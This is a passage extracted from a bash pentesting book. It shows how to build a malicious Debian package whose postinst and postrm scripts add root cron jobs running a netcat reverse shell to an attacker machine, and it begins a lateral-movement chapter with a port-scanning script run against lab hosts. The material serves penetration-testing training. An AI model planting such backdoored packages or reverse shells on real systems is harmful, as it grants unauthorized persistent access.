@@ -1,0 +1,133 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 253 - Next, create postinst and postrm files in the DEBIAN directory and set their permissions:
+$ touch postinst postrm
+$ chmod 775 postinst postrm
+Security Relevance Score: 10
+Word Count: 1289
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Next, create postinst and postrm files in the DEBIAN directory and set their permissions:
+$ touch postinst postrm
+$ chmod 775 postinst postrm
+
+Your directory structure should look like this:
+$ tree bksh
+
+bksh
+└── DEBIAN
+     ├── control
+     ├── postinst
+     └── postrm
+
+2 directories, 3 files
+
+Populate the postinst script with a bash script that calls the reverse shell. For example, the script in Listing 10-9 will reach out to the Kali machine by using the system-wide crontab file /etc/crontab:
+#!/bin/bash
+
+if ! grep -q "4444" /etc/crontab; then
+  echo "* * * * * root nc 172.16.10.1 4444 -e /bin/bash" >> /etc/crontab
+fi
+
+Listing 10-9: A reverse shell callback using /etc/crontab
+When a user first installs the package, an entry will be written into /etc/crontab. That user could be the root user, or any other user that can install packages by using a tool such as dpkg. To ensure that we write this entry only once, we use grep to check whether the string 4444 exists in the file before proceeding with the actual modification.
+Next, populate the postrm script with another reverse shell. This time, the cron job will belong to the user that executes the package removal and won’t be system-wide:
+#!/bin/bash
+
+if ! grep -q "4444" /var/spool/cron/crontabs/root 2> /dev/null; then
+  echo "* * * * * nc 172.16.10.1 4444 -e /bin/bash" | crontab - -u root
+fi
+
+This second script provides a fallback mechanism in cases when this package is removed from the system.
+You can develop additional fallback persistence mechanisms as an extension to the exercise. For example, try writing a small web shell to a file on the system if the system shows signs of running web server processes to common web directories, such as /var/www/html.
+To test the package, build it, then start a Netcat reverse shell on your Kali machine. Copy the package to one of the lab machines, such as p-jumpbox-01 (172.16.10.13), and install it by using the root user:
+# dpkg -i bksh_amd64.deb
+Then verify that you can see the reverse shell cron job in /etc/crontab:
+$ grep 4444 /etc/crontab
+After about a minute, you should see the reverse shell connection to your Kali Netcat listener. To test postrm, remove the package from p-jumpbox-01, then check the root user’s crontab.
+
+
+
+Summary
+In this chapter, you learned many ways of using bash to persist your access in the post-compromise stage. We introduced malicious logic to PAM modules, system profiles, text editors, and fake utilities. We also enabled dormant accounts and added rogue SSH keys, then packaged malicious software using the DEB format.
+
+
+
+
+
+
+
+
+
+
+
+
+11
+NETWORK PROBING AND LATERAL MOVEMENT
+
+
+
+The network or machine to which you initially gain access during a penetration test might offer little of value. By moving laterally through a target’s environment, you can find crown jewels such as adjacent networks, databases, application servers, file-sharing servers, and more.
+As a penetration tester, you’ll quickly learn that real-life enterprise environments emphasize the security of their externally facing assets: those that are exposed to the wild and noisy internet. This is because the external perimeter is considered to be a greater risk than the internal networks used by trusted users such as employees.
+Whereas companies may have only a handful of internet-facing assets, such as marketing websites or other web servers, their internal networks are often target rich. You may find printers, network switches, employee computers, file servers, smart devices, and more once you land on an organization’s internal network.
+To identify and then access these resources, you can repeat steps we’ve already covered: performing reconnaissance, gathering valuable network information, identifying and exploiting vulnerabilities, and compromising endpoints connected to the network of interest. As such, this chapter will reinforce lessons from earlier in the book to scan an internally accessible network and identify additional assets, though we’ll highlight a few new techniques.
+The examples will target the lab environment’s corporate network (10.1.0.0/24). Before continuing, we recommend you take a second look at Figure 3.2 on page 58 to refresh your memory regarding the available networks in the lab—namely, the public and corporate networks.
+The machines p-jumpbox-01 (172.16.10.13) and p-web-02 (172.16.10.12) are the only ones with a leg in both the public and corporate networks. Each machine has two network interfaces, allowing them to be part of both networks. As such, we’ll perform some of the attacks in this chapter from these machines; we’ll execute the others from Kali by using port forwarding.
+
+Probing the Corporate Network
+We have yet to collect information about the 10.1.0.0/24 corporate network. In this section, we’ll build a small port scanner that uses special files to map found ports to named services and speed up port scanning by prioritizing ports based on how frequently they’re found open in the wild. Internal networks tend to host far more assets than a penetration tester might see from the outside, so tweaking your processes and tools can help accelerate this asset discovery.
+We’ll perform a network scan from the p-jumpbox-01 (172.16.10.13) machine by using tools available on the operating system. Note that you could also modify and reuse some of the port-scanning and information-gathering scripts used so far in the book.
+
+Service Mapping
+On Linux, the /etc/services file maps services to the port numbers assigned by the Internet Assigned Numbers Authority. The file contains a few columns separated by tabs, such as the service name, the port number and protocol (for example, 22/tcp), and the description of the service. Here is a snippet of the /etc/services file from p-jumpbox-01:
+$ grep -w -e 3306/tcp -e 3389/tcp -e 22/tcp -e 23/tcp -e 25/tcp /etc/services
+
+ssh                22/tcp          # SSH Remote Login Protocol
+telnet             23/tcp
+smtp               25/tcp          mail
+mysql            3306/tcp
+ms-wbt-server    3389/tcp
+
+With grep, we use -w to perform a whole-word match and use -e to look for multiple TCP ports. We can use this file to iterate through common ports and identify the services they’re likely running. Listing 11-1 is a bash script that takes advantage of /etc/services in this way. It uses Ncat installed on p-jumpbox-01 for the port scanning.
+#!/bin/bash
+TARGETS=("$@") ❶
+
+print_help(){
+  echo "Usage: ${0} <LIST OF IPS>"
+  echo "${0} 10.1.0.1 10.1.0.2 10.1.0.3"
+}
+
+if [[${#TARGETS[@]} -eq 0]]; then ❷
+  echo "Must provide one or more IP addresses!"
+  print_help ❸
+  exit 1
+fi
+
+for target in "${TARGETS[@]}"; do ❹
+  while read -r port; do
+    if timeout 1 nc -i 1 "${target}" -v "${port}" 2>&1 | grep -q "Connected to"; then ❺
+      echo "IP: ${target}"
+      echo "Port: ${port}"
+      echo "Service: $(grep -w "${port}/tcp" /etc/services | awk '{print $1}')"
+    fi
+  done < <(grep "/tcp" /etc/services | awk '{print $2}' | tr -d '/tcp') ❻
+done
+
+Listing 11-1: Performing port scanning by using /etc/services as a database file
+At ❶, we define the TARGETS=() array variable, using "$@" inside the parentheses to assign any command line arguments passed to the script to this array. We then use an if condition to check whether the TARGETS array is empty ❷. If so, we print a help message ❸ by using the print_help() function.
+We iterate through the TARGETS array ❹. We also iterate through all the TCP ports in /etc/services by using a while loop ❻, then connect to the target and port by using the nc command ❺. If the port is found open, we print the target, the port, and the service name mapping from /etc/services. The script should output the following when run against c-backup-01 (10.1.0.13) and c-redis-01 (10.1.0.14):
+$ ./port_scan_etc_services.sh 10.1.0.13 10.1.0.14
+
+IP: 10.1.0.13
+Port: 8080
+Service: http-alt
+IP: 10.1.0.14
+Port: 22
+Service: ssh
+IP: 10.1.0.14
+Port: 6379
+Service: redis
+
+As you can see, we’ve identified a few open ports and their commonly assigned service names. For example, we see that the key-value database Redis often uses port
